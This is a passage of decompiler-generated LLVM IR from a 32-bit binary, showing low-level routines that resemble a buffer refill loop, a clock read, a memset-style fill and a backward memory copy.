  uselistorder i32 (i32)* @function_404d20, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_4055a8, { 1, 0 }
  uselistorder label %dec_label_pc_405570, { 1, 0 }
  uselistorder label %dec_label_pc_40553c, { 1, 0 }
  uselistorder label %dec_label_pc_4054f4, { 1, 0 }
  uselistorder label %dec_label_pc_405488, { 1, 0 }
}

define i32 @function_4055e0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4055e0:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_405604 = add i32 %tmp, 24
  store i32 %v1_405604, i32* @s0, align 4
  %v3_405608 = load i32, i32* @global_var_449ba8.181, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_405614 = ptrtoint i32* %stack_var_-32 to i32
  %v6_405614 = call i32 @function_406dac(i32 %v3_405614, i32 %v3_405608)
  %v1_40562c = load i32, i32* @s0, align 4
  %v3_40562c = call i32 @function_406da4(i32 %v1_40562c)
  br label %dec_label_pc_405638

dec_label_pc_405638:                              ; preds = %dec_label_pc_405678, %dec_label_pc_4055e0
  %v0_405638 = load i32, i32* @s1, align 4
  %v1_405638 = add i32 %v0_405638, 4
  %v2_405638 = inttoptr i32 %v1_405638 to i32*
  %v3_405638 = load i32, i32* %v2_405638, align 4
  %v1_40563c = add i32 %v0_405638, 8
  %v2_40563c = inttoptr i32 %v1_40563c to i32*
  %v3_40563c = load i32, i32* %v2_40563c, align 4
  %v3_405640 = load i32, i32* @global_var_449c4c.188, align 4
  store i32 %v3_405640, i32* @t9, align 4
  %v2_405644 = icmp ult i32 %v3_405638, %v3_40563c
  br i1 %v2_405644, label %dec_label_pc_405678, label %dec_label_pc_40564c

dec_label_pc_40564c:                              ; preds = %dec_label_pc_405638
  %v1_405650 = inttoptr i32 %v0_405638 to i32*
  %v2_405650 = load i32, i32* %v1_405650, align 4
  store i32 %v2_405650, i32* @a0, align 4
  %v1_405654 = add i32 %v0_405638, 12
  %v2_405654 = inttoptr i32 %v1_405654 to i32*
  %v3_405654 = load i32, i32* %v2_405654, align 4
  %v1_405658 = add i32 %v0_405638, 20
  %v2_405658 = inttoptr i32 %v1_405658 to i32*
  %v3_405658 = load i32, i32* %v2_405658, align 4
  store i32 %v3_405658, i32* @a2, align 4
  %v4_40565c = inttoptr i32 %v2_405650 to i32*
  %v5_40565c = call i32 @function_4074c0(i32* %v4_40565c, i32 %v3_405654, i32 %v3_405658)
  store i32 %v5_40565c, i32* @v0, align 4
  %v1_405668 = icmp slt i32 %v5_40565c, 1
  store i32 0, i32* @s0, align 4
  br i1 %v1_405668, label %dec_label_pc_4056b4, label %dec_label_pc_40566c

dec_label_pc_40566c:                              ; preds = %dec_label_pc_40564c
  %v1_405670 = load i32, i32* @s1, align 4
  %v2_405670 = add i32 %v1_405670, 8
  %v3_405670 = inttoptr i32 %v2_405670 to i32*
  store i32 %v5_40565c, i32* %v3_405670, align 4
  %v0_405674 = load i32, i32* @s1, align 4
  %v1_405674 = add i32 %v0_405674, 4
  %v2_405674 = inttoptr i32 %v1_405674 to i32*
  store i32 0, i32* %v2_405674, align 4
  %v0_405678.pre = load i32, i32* @s1, align 4
  br label %dec_label_pc_405678

dec_label_pc_405678:                              ; preds = %dec_label_pc_405638, %dec_label_pc_40566c
  %v1_405694 = phi i32 [ %v0_405638, %dec_label_pc_405638 ], [ %v0_405678.pre, %dec_label_pc_40566c ]
  %v1_405678 = add i32 %v1_405694, 4
  %v2_405678 = inttoptr i32 %v1_405678 to i32*
  %v3_405678 = load i32, i32* %v2_405678, align 4
  %v1_40567c = add i32 %v1_405694, 12
  %v2_40567c = inttoptr i32 %v1_40567c to i32*
  %v3_40567c = load i32, i32* %v2_40567c, align 4
  %v2_405684 = add i32 %v3_40567c, %v3_405678
  store i32 %v2_405684, i32* @s0, align 4
  %v1_405688 = add i32 %v2_405684, 8
  %v2_405688 = inttoptr i32 %v1_405688 to i16*
  %v3_405688 = load i16, i16* %v2_405688, align 2
  %v4_405688 = zext i16 %v3_405688 to i32
  %v2_405690 = add i32 %v4_405688, %v3_405678
  store i32 %v2_405690, i32* %v2_405678, align 4
  %v0_405698 = load i32, i32* @s0, align 4
  %v1_405698 = add i32 %v0_405698, 4
  %v2_405698 = inttoptr i32 %v1_405698 to i32*
  %v3_405698 = load i32, i32* %v2_405698, align 4
  %v1_4056a0 = load i32, i32* @s1, align 4
  %v2_4056a0 = add i32 %v1_4056a0, 16
  %v3_4056a0 = inttoptr i32 %v2_4056a0 to i32*
  store i32 %v3_405698, i32* %v3_4056a0, align 4
  %v0_4056a4 = load i32, i32* @s0, align 4
  %v1_4056a4 = inttoptr i32 %v0_4056a4 to i32*
  %v2_4056a4 = load i32, i32* %v1_4056a4, align 4
  store i32 %v2_4056a4, i32* @v0, align 4
  %v1_4056ac = icmp eq i32 %v2_4056a4, 0
  br i1 %v1_4056ac, label %dec_label_pc_405638, label %dec_label_pc_4056b4

dec_label_pc_4056b4:                              ; preds = %dec_label_pc_405678, %dec_label_pc_40564c
  %v3_4056bc = call i32 @function_406dac(i32 %v3_405614, i32 1)
  %v0_4056c4 = load i32, i32* @s0, align 4
  ret i32 %v0_4056c4

; uselistorder directives
  uselistorder i32 %v1_405694, { 1, 0 }
  uselistorder i32 %v0_405638, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_405678, { 1, 0 }
}

define i32 @function_4056e0() local_unnamed_addr {
dec_label_pc_4056e0:
  %v3_4056ec = load i32, i32* bitcast (i32** @global_var_449a88.190 to i32*), align 4
  ret i32 %v3_4056ec
}

define i32 @function_405700() local_unnamed_addr {
dec_label_pc_405700:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_405718 = load i32, i32* @global_var_449b80.191, align 4
  store i32 %v3_405718, i32* @t9, align 4
  %v5_405720 = bitcast i32* %stack_var_-24 to %tms*
  %v6_405720 = call i32 @function_407b50(%tms* %v5_405720)
  %v3_40572c = load i32, i32* %stack_var_-24, align 4
  %v2_405734 = add i32 %v3_40572c, %tmp
  %v1_405754 = mul i32 %v2_405734, 10000
  %v2_405760 = and i32 %v1_405754, 2147483632
  ret i32 %v2_405760

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_405770(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405770:
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* @a1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a0, align 4
  %v1_405770 = icmp slt i32 %arg3, 8
  br i1 %v1_405770, label %dec_label_pc_4057e4, label %dec_label_pc_405778

dec_label_pc_405778:                              ; preds = %dec_label_pc_405770
  %v1_40577c = icmp eq i32 %arg2, 0
  %v3_40577c = urem i32 %arg2, 256
  br i1 %v1_40577c, label %dec_label_pc_405794, label %dec_label_pc_405780

dec_label_pc_405780:                              ; preds = %dec_label_pc_405778
  %v1_405784 = mul nuw nsw i32 %v3_40577c, 256
  %v2_405788 = or i32 %v1_405784, %v3_40577c
  %v1_40578c = mul i32 %v2_405788, 65536
  %v2_405790 = or i32 %v1_40578c, %v2_405788
  br label %dec_label_pc_405794

dec_label_pc_405794:                              ; preds = %dec_label_pc_405778, %dec_label_pc_405780
  %storemerge = phi i32 [ %v2_405790, %dec_label_pc_405780 ], [ %v3_40577c, %dec_label_pc_405778 ]
  %v0_4057c44 = phi i32 [ %v2_405790, %dec_label_pc_405780 ], [ %v3_40577c, %dec_label_pc_405778 ]
  store i32 %storemerge, i32* @a1, align 4
  %v1_405794 = sub i32 0, %tmp
  %v1_405798 = urem i32 %v1_405794, 4
  %v1_40579c = icmp eq i32 %v1_405798, 0
  %v4_40579c = sub i32 %arg3, %v1_405798
  store i32 %v4_40579c, i32* %a2.global-to-local, align 4
  br i1 %v1_40579c, label %dec_label_pc_4057ac, label %dec_label_pc_4057a0

dec_label_pc_4057a0:                              ; preds = %dec_label_pc_405794
  %v2_4057a8 = add i32 %v1_405798, %tmp
  store i32 %v2_4057a8, i32* @a0, align 4
  br label %dec_label_pc_4057ac

dec_label_pc_4057ac:                              ; preds = %dec_label_pc_405794, %dec_label_pc_4057a0
  %v1_4057b8 = phi i32 [ %tmp, %dec_label_pc_405794 ], [ %v2_4057a8, %dec_label_pc_4057a0 ]
  %v1_4057ac = urem i32 %v4_40579c, 8
  %v2_4057b0 = icmp eq i32 %v4_40579c, %v1_4057ac
  %v5_4057b0 = sub i32 %v4_40579c, %v1_4057ac
  store i32 %v5_4057b0, i32* %a3.global-to-local, align 4
  br i1 %v2_4057b0, label %dec_label_pc_4057d0, label %dec_label_pc_4057b4

dec_label_pc_4057b4:                              ; preds = %dec_label_pc_4057ac
  %v2_4057b8 = add i32 %v1_4057b8, %v5_4057b0
  store i32 %v2_4057b8, i32* %a3.global-to-local, align 4
  store i32 %v1_4057ac, i32* %a2.global-to-local, align 4
  %v1_4057c016 = add i32 %v1_4057b8, 8
  store i32 %v1_4057c016, i32* @a0, align 4
  %v3_4057c417 = inttoptr i32 %v1_4057b8 to i32*
  store i32 %v0_4057c44, i32* %v3_4057c417, align 4
  %v0_4057c818 = load i32, i32* @a0, align 4
  %v1_4057c819 = load i32, i32* %a3.global-to-local, align 4
  %v2_4057c820 = icmp eq i32 %v0_4057c818, %v1_4057c819
  %v3_4057c821 = load i32, i32* @a1, align 4
  %v5_4057c822 = add i32 %v0_4057c818, -4
  %v6_4057c823 = inttoptr i32 %v5_4057c822 to i32*
  store i32 %v3_4057c821, i32* %v6_4057c823, align 4
  br i1 %v2_4057c820, label %dec_label_pc_4057d0.loopexit, label %dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge

dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge: ; preds = %dec_label_pc_4057b4, %dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge
  %v0_4057c0.pre = load i32, i32* @a0, align 4
  %v0_4057c4.pre = load i32, i32* @a1, align 4
  %v1_4057c0 = add i32 %v0_4057c0.pre, 8
  store i32 %v1_4057c0, i32* @a0, align 4
  %v3_4057c4 = inttoptr i32 %v0_4057c0.pre to i32*
  store i32 %v0_4057c4.pre, i32* %v3_4057c4, align 4
  %v0_4057c8 = load i32, i32* @a0, align 4
  %v1_4057c8 = load i32, i32* %a3.global-to-local, align 4
  %v2_4057c8 = icmp eq i32 %v0_4057c8, %v1_4057c8
  %v3_4057c8 = load i32, i32* @a1, align 4
  %v5_4057c8 = add i32 %v0_4057c8, -4
  %v6_4057c8 = inttoptr i32 %v5_4057c8 to i32*
  store i32 %v3_4057c8, i32* %v6_4057c8, align 4
  br i1 %v2_4057c8, label %dec_label_pc_4057d0.loopexit, label %dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge

dec_label_pc_4057d0.loopexit:                     ; preds = %dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge, %dec_label_pc_4057b4
  %v0_4057d0.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4057d0

dec_label_pc_4057d0:                              ; preds = %dec_label_pc_4057d0.loopexit, %dec_label_pc_4057ac
  %v0_4057d0 = phi i32 [ %v0_4057d0.pre, %dec_label_pc_4057d0.loopexit ], [ %v4_40579c, %dec_label_pc_4057ac ]
  %v1_4057d0 = and i32 %v0_4057d0, 4
  %v1_4057d4 = icmp eq i32 %v1_4057d0, 0
  %v4_4057d4 = sub i32 %v0_4057d0, %v1_4057d0
  store i32 %v4_4057d4, i32* %a2.global-to-local, align 4
  br i1 %v1_4057d4, label %dec_label_pc_4057d0.dec_label_pc_4057e4_crit_edge, label %dec_label_pc_4057d8

dec_label_pc_4057d0.dec_label_pc_4057e4_crit_edge: ; preds = %dec_label_pc_4057d0
  %v3_4057e4.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4057e4

dec_label_pc_4057d8:                              ; preds = %dec_label_pc_4057d0
  %v0_4057dc = load i32, i32* @a1, align 4
  %v1_4057dc = load i32, i32* @a0, align 4
  %v2_4057dc = inttoptr i32 %v1_4057dc to i32*
  store i32 %v0_4057dc, i32* %v2_4057dc, align 4
  %v0_4057e0 = load i32, i32* @a0, align 4
  %v1_4057e0 = add i32 %v0_4057e0, 4
  store i32 %v1_4057e0, i32* @a0, align 4
  %v0_4057e4.pr.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4057e4

dec_label_pc_4057e4:                              ; preds = %dec_label_pc_405770, %dec_label_pc_4057d8, %dec_label_pc_4057d0.dec_label_pc_4057e4_crit_edge
  %v3_4057e4 = phi i32 [ %v3_4057e4.pre, %dec_label_pc_4057d0.dec_label_pc_4057e4_crit_edge ], [ %v1_4057e0, %dec_label_pc_4057d8 ], [ %tmp, %dec_label_pc_405770 ]
  %v0_4057e4 = phi i32 [ %v4_4057d4, %dec_label_pc_4057d0.dec_label_pc_4057e4_crit_edge ], [ %v0_4057e4.pr.pre, %dec_label_pc_4057d8 ], [ %arg3, %dec_label_pc_405770 ]
  %v1_4057e4 = icmp slt i32 %v0_4057e4, 1
  %v4_4057e4 = add i32 %v0_4057e4, %v3_4057e4
  store i32 %v4_4057e4, i32* @a3, align 4
  br i1 %v1_4057e4, label %dec_label_pc_4057f8, label %dec_label_pc_4057ec.preheader

dec_label_pc_4057ec.preheader:                    ; preds = %dec_label_pc_4057e4
  %v1_4057ec11 = add i32 %v3_4057e4, 1
  store i32 %v1_4057ec11, i32* @a0, align 4
  %v2_4057f012 = icmp eq i32 %v1_4057ec11, %v4_4057e4
  %v3_4057f013 = load i32, i32* @a1, align 4
  %v4_4057f014 = trunc i32 %v3_4057f013 to i8
  %v7_4057f015 = inttoptr i32 %v3_4057e4 to i8*
  store i8 %v4_4057f014, i8* %v7_4057f015, align 1
  br i1 %v2_4057f012, label %dec_label_pc_4057f8, label %dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge

dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge: ; preds = %dec_label_pc_4057ec.preheader, %dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge
  %v0_4057ec.pre = load i32, i32* @a0, align 4
  %v1_4057f0.pre = load i32, i32* @a3, align 4
  %v1_4057ec = add i32 %v0_4057ec.pre, 1
  store i32 %v1_4057ec, i32* @a0, align 4
  %v2_4057f0 = icmp eq i32 %v1_4057ec, %v1_4057f0.pre
  %v3_4057f0 = load i32, i32* @a1, align 4
  %v4_4057f0 = trunc i32 %v3_4057f0 to i8
  %v7_4057f0 = inttoptr i32 %v0_4057ec.pre to i8*
  store i8 %v4_4057f0, i8* %v7_4057f0, align 1
  br i1 %v2_4057f0, label %dec_label_pc_4057f8, label %dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge

dec_label_pc_4057f8:                              ; preds = %dec_label_pc_4057ec.preheader, %dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge, %dec_label_pc_4057e4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_4057d0, { 1, 0 }
  uselistorder i32 %v1_4057ac, { 2, 0, 1 }
  uselistorder i32 %v4_40579c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_405798, { 2, 1, 0 }
  uselistorder i32 %v2_405788, { 1, 0 }
  uselistorder i32 %v3_40577c, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 4, 1, 2, 0, 3, 5 }
  uselistorder i32* %a3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_4057f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4057ec.dec_label_pc_4057ec_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4057e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_4057c0.dec_label_pc_4057c0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4057ac, { 1, 0 }
  uselistorder label %dec_label_pc_405794, { 1, 0 }
}

define i32 @function_405800(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405800:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @a2, align 4
  store i32 %arg2, i32* @a1, align 4
  store i32 %arg1, i32* @a0, align 4
  %v1_405808 = load i32, i32* @t9, align 4
  %v2_405808 = add i32 %v1_405808, 311728
  store i32 %v2_405808, i32* %gp.global-to-local, align 4
  %v2_40581c = sub i32 %arg1, %arg2
  %v2_405820 = icmp ult i32 %v2_40581c, %arg3
  %v3_405820 = zext i1 %v2_405820 to i32
  store i32 %v3_405820, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %v1.global-to-local, align 4
  br i1 %v2_405820, label %dec_label_pc_40584c, label %dec_label_pc_40582c

dec_label_pc_40582c:                              ; preds = %dec_label_pc_405800
  %v3_405830 = load i32, i32* @global_var_449b68.192, align 4
  store i32 %v3_405830, i32* @t9, align 4
  %v1_405838 = call i32 @function_407df0()
  store i32 %v2_405808, i32* %gp.global-to-local, align 4
  %v0_405848 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405848, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40584c

dec_label_pc_40584c:                              ; preds = %dec_label_pc_405800, %dec_label_pc_40582c
  %v1_40584c = icmp ult i32 %arg3, 16
  %v2_40584c = zext i1 %v1_40584c to i32
  store i32 %v2_40584c, i32* %v0.global-to-local, align 4
  %v2_405850 = add i32 %arg3, %arg2
  store i32 %v2_405850, i32* %a1.global-to-local, align 4
  %v4_405854 = add i32 %arg3, %arg1
  store i32 %v4_405854, i32* %t2.global-to-local, align 4
  br i1 %v1_40584c, label %dec_label_pc_40584c.dec_label_pc_405af8_crit_edge, label %dec_label_pc_405858

dec_label_pc_40584c.dec_label_pc_405af8_crit_edge: ; preds = %dec_label_pc_40584c
  %v0_405afc.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405af8

dec_label_pc_405858:                              ; preds = %dec_label_pc_40584c
  %v1_40585c = urem i32 %v4_405854, 4
  store i32 %v1_40585c, i32* %v0.global-to-local, align 4
  %v2_405860 = sub i32 %arg3, %v1_40585c
  store i32 %v2_405860, i32* %a2.global-to-local, align 4
  store i32 %v1_40585c, i32* %v1.global-to-local, align 4
  %v1_40586c33 = add i32 %v2_405850, -1
  store i32 %v1_40586c33, i32* %a1.global-to-local, align 4
  %v1_40587034 = inttoptr i32 %v1_40586c33 to i8*
  %v2_40587035 = load i8, i8* %v1_40587034, align 1
  %v3_40587036 = zext i8 %v2_40587035 to i32
  store i32 %v3_40587036, i32* %v0.global-to-local, align 4
  %v1_40587437 = add i32 %v4_405854, -1
  store i32 %v1_40587437, i32* %t2.global-to-local, align 4
  %v3_40587838 = inttoptr i32 %v1_40587437 to i8*
  store i8 %v2_40587035, i8* %v3_40587838, align 1
  %v0_40587c39 = load i32, i32* %v1.global-to-local, align 4
  %v1_40587c40 = icmp eq i32 %v0_40587c39, 0
  %v3_40587c41 = add i32 %v0_40587c39, -1
  store i32 %v3_40587c41, i32* %v1.global-to-local, align 4
  %v0_40588442 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_40587c40, label %dec_label_pc_405880, label %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge

dec_label_pc_40586c.dec_label_pc_40586c_crit_edge: ; preds = %dec_label_pc_405858, %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge
  %v0_40588443 = phi i32 [ %v0_405884, %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge ], [ %v0_40588442, %dec_label_pc_405858 ]
  %v0_405874.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_40586c = add i32 %v0_40588443, -1
  store i32 %v1_40586c, i32* %a1.global-to-local, align 4
  %v1_405870 = inttoptr i32 %v1_40586c to i8*
  %v2_405870 = load i8, i8* %v1_405870, align 1
  %v3_405870 = zext i8 %v2_405870 to i32
  store i32 %v3_405870, i32* %v0.global-to-local, align 4
  %v1_405874 = add i32 %v0_405874.pre, -1
  store i32 %v1_405874, i32* %t2.global-to-local, align 4
  %v3_405878 = inttoptr i32 %v1_405874 to i8*
  store i8 %v2_405870, i8* %v3_405878, align 1
  %v0_40587c = load i32, i32* %v1.global-to-local, align 4
  %v1_40587c = icmp eq i32 %v0_40587c, 0
  %v3_40587c = add i32 %v0_40587c, -1
  store i32 %v3_40587c, i32* %v1.global-to-local, align 4
  %v0_405884 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_40587c, label %dec_label_pc_405880, label %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge

dec_label_pc_405880:                              ; preds = %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge, %dec_label_pc_405858
  %v0_405884.lcssa = phi i32 [ %v0_40588442, %dec_label_pc_405858 ], [ %v0_405884, %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge ]
  %v1_405884 = urem i32 %v0_405884.lcssa, 4
  store i32 %v1_405884, i32* %v0.global-to-local, align 4
  %v1_405888 = icmp eq i32 %v1_405884, 0
  %v2_405888 = load i32, i32* %a2.global-to-local, align 4
  %v3_405888 = udiv i32 %v2_405888, 4
  store i32 %v3_405888, i32* %a3.global-to-local, align 4
  br i1 %v1_405888, label %dec_label_pc_40588c, label %dec_label_pc_4059c8

dec_label_pc_40588c:                              ; preds = %dec_label_pc_405880
  %v1_405890 = urem i32 %v3_405888, 8
  store i32 %v1_405890, i32* %t1.global-to-local, align 4
  store i32 %v0_405884.lcssa, i32* %a0.global-to-local, align 4
  store i32 %v3_405888, i32* %t0.global-to-local, align 4
  %v1_4058ac = mul nuw nsw i32 %v1_405890, 4
  store i32 ptrtoint (i32* @global_var_409570.193 to i32), i32* %v1.global-to-local, align 4
  %v2_4058b4 = add i32 %v1_4058ac, ptrtoint (i32* @global_var_409570.193 to i32)
  store i32 %v2_4058b4, i32* %v0.global-to-local, align 4
  %v1_4058b8 = inttoptr i32 %v2_4058b4 to i32*
  %v2_4058b8 = load i32, i32* %v1_4058b8, align 4
  %v1_4058c0 = load i32, i32* %gp.global-to-local, align 4
  %v2_4058c0 = add i32 %v1_4058c0, %v2_4058b8
  store i32 %v2_4058c0, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_4058c0)
  store i32 0, i32* %t1.global-to-local, align 4
  %v0_4058d4 = load i32, i32* %a1.global-to-local, align 4
  %v1_4058d4 = add i32 %v0_4058d4, -8
  store i32 %v1_4058d4, i32* %a0.global-to-local, align 4
  %v1_4058d8 = add i32 %v0_4058d4, -4
  %v2_4058d8 = inttoptr i32 %v1_4058d8 to i32*
  %v3_4058d8 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_4058d8, i32* %v0.global-to-local, align 4
  %v0_4058dc = load i32, i32* %a3.global-to-local, align 4
  %v1_4058dc = add i32 %v0_4058dc, 6
  store i32 %v1_4058dc, i32* %t0.global-to-local, align 4
  %v0_4058e4 = load i32, i32* %t2.global-to-local, align 4
  %v1_4058e4 = add i32 %v0_4058e4, -4
  store i32 %v1_4058e4, i32* %v1.global-to-local, align 4
  %v1_4058e8 = add i32 %v0_4058d4, -12
  store i32 %v1_4058e8, i32* %a0.global-to-local, align 4
  %v3_4058ec = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_4058ec, i32* %t1.global-to-local, align 4
  %v1_4058f0 = add i32 %v0_4058dc, 5
  store i32 %v1_4058f0, i32* %t0.global-to-local, align 4
  %v1_4058f8 = add i32 %v0_4058e4, -8
  store i32 %v1_4058f8, i32* %v1.global-to-local, align 4
  %v1_4058fc = add i32 %v0_4058d4, -16
  store i32 %v1_4058fc, i32* %a0.global-to-local, align 4
  %v3_405900 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_405900, i32* %v0.global-to-local, align 4
  %v1_405904 = add i32 %v0_4058dc, 4
  store i32 %v1_405904, i32* %t0.global-to-local, align 4
  %v1_40590c = add i32 %v0_4058e4, -12
  store i32 %v1_40590c, i32* %v1.global-to-local, align 4
  %v1_405910 = add i32 %v0_4058d4, -20
  store i32 %v1_405910, i32* %a0.global-to-local, align 4
  %v3_405914 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_405914, i32* %t1.global-to-local, align 4
  %v1_405918 = add i32 %v0_4058dc, 3
  store i32 %v1_405918, i32* %t0.global-to-local, align 4
  %v1_405920 = add i32 %v0_4058e4, -16
  store i32 %v1_405920, i32* %v1.global-to-local, align 4
  %v1_405924 = add i32 %v0_4058d4, -24
  store i32 %v1_405924, i32* %a0.global-to-local, align 4
  %v3_405928 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_405928, i32* %v0.global-to-local, align 4
  %v1_40592c = add i32 %v0_4058dc, 2
  store i32 %v1_40592c, i32* %t0.global-to-local, align 4
  %v1_405934 = add i32 %v0_4058e4, -20
  store i32 %v1_405934, i32* %v1.global-to-local, align 4
  %v1_405938 = add i32 %v0_4058d4, -28
  store i32 %v1_405938, i32* %a0.global-to-local, align 4
  %v3_40593c = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_40593c, i32* %t1.global-to-local, align 4
  %v1_405940 = add i32 %v0_4058dc, 1
  store i32 %v1_405940, i32* %t0.global-to-local, align 4
  %v1_405948 = add i32 %v0_4058e4, -24
  store i32 %v1_405948, i32* %v1.global-to-local, align 4
  %v1_40594c = add i32 %v0_4058d4, -32
  store i32 %v1_40594c, i32* %a0.global-to-local, align 4
  %v3_405950 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_405950, i32* %v0.global-to-local, align 4
  %v1_405958 = add i32 %v0_4058e4, -28
  store i32 %v1_405958, i32* %v1.global-to-local, align 4
  %v1_40595c = add i32 %v0_4058d4, -36
  store i32 %v1_40595c, i32* %a0.global-to-local, align 4
  %v3_405960 = load i32, i32* %v2_4058d8, align 4
  store i32 %v3_405960, i32* %t1.global-to-local, align 4
  %v1_405964 = add i32 %v0_4058dc, -1
  store i32 %v1_405964, i32* %t0.global-to-local, align 4
  %v1_405968 = add i32 %v0_4058e4, -32
  store i32 %v1_405968, i32* %v1.global-to-local, align 4
  %v2_40596c = inttoptr i32 %v1_4058d4 to i32*
  %v3_40596c = load i32, i32* %v2_40596c, align 4
  store i32 %v3_40596c, i32* %v0.global-to-local, align 4
  %v3_405970 = inttoptr i32 %v1_4058e4 to i32*
  store i32 %v3_405960, i32* %v3_405970, align 4
  %v0_405974 = load i32, i32* %a0.global-to-local, align 4
  %v1_405974 = add i32 %v0_405974, 24
  %v2_405974 = inttoptr i32 %v1_405974 to i32*
  %v3_405974 = load i32, i32* %v2_405974, align 4
  store i32 %v3_405974, i32* %t1.global-to-local, align 4
  %v0_405978 = load i32, i32* %v0.global-to-local, align 4
  %v1_405978 = load i32, i32* %v1.global-to-local, align 4
  %v2_405978 = add i32 %v1_405978, 24
  %v3_405978 = inttoptr i32 %v2_405978 to i32*
  store i32 %v0_405978, i32* %v3_405978, align 4
  %v0_40597c = load i32, i32* %a0.global-to-local, align 4
  %v1_40597c = add i32 %v0_40597c, 20
  %v2_40597c = inttoptr i32 %v1_40597c to i32*
  %v3_40597c = load i32, i32* %v2_40597c, align 4
  store i32 %v3_40597c, i32* %v0.global-to-local, align 4
  %v0_405980 = load i32, i32* %t1.global-to-local, align 4
  %v1_405980 = load i32, i32* %v1.global-to-local, align 4
  %v2_405980 = add i32 %v1_405980, 20
  %v3_405980 = inttoptr i32 %v2_405980 to i32*
  store i32 %v0_405980, i32* %v3_405980, align 4
  %v0_405984 = load i32, i32* %a0.global-to-local, align 4
  %v1_405984 = add i32 %v0_405984, 16
  %v2_405984 = inttoptr i32 %v1_405984 to i32*
  %v3_405984 = load i32, i32* %v2_405984, align 4
  store i32 %v3_405984, i32* %t1.global-to-local, align 4
  %v0_405988 = load i32, i32* %v0.global-to-local, align 4
  %v1_405988 = load i32, i32* %v1.global-to-local, align 4
  %v2_405988 = add i32 %v1_405988, 16
  %v3_405988 = inttoptr i32 %v2_405988 to i32*
  store i32 %v0_405988, i32* %v3_405988, align 4
  %v0_40598c = load i32, i32* %a0.global-to-local, align 4
  %v1_40598c = add i32 %v0_40598c, 12
  %v2_40598c = inttoptr i32 %v1_40598c to i32*
  %v3_40598c = load i32, i32* %v2_40598c, align 4
  store i32 %v3_40598c, i32* %v0.global-to-local, align 4
  %v0_405990 = load i32, i32* %t1.global-to-local, align 4
  %v1_405990 = load i32, i32* %v1.global-to-local, align 4
  %v2_405990 = add i32 %v1_405990, 12
  %v3_405990 = inttoptr i32 %v2_405990 to i32*
  store i32 %v0_405990, i32* %v3_405990, align 4
  %v0_405994 = load i32, i32* %a0.global-to-local, align 4
  %v1_405994 = add i32 %v0_405994, 8
  %v2_405994 = inttoptr i32 %v1_405994 to i32*
  %v3_405994 = load i32, i32* %v2_405994, align 4
  store i32 %v3_405994, i32* %t1.global-to-local, align 4
  %v0_405998 = load i32, i32* %v0.global-to-local, align 4
  %v1_405998 = load i32, i32* %v1.global-to-local, align 4
